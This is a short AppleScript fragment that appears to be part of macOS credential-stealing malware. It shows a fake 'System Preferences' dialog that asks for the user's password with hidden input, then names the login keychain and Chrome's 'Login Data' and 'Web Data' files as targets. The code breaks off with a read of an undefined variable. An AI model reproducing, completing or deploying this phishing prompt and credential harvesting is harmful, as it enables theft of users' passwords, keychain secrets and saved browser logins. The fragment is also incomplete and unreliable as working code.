set reply to display dialog "Enter your password" default answer "" with hidden answer with title "System Preferences"
set secret to text returned of reply
set target to "Keychains/login.keychain-db"
set profile to "Google/Chrome/"
set stores to {"/Login Data", "/Web Data"}
set data to read source
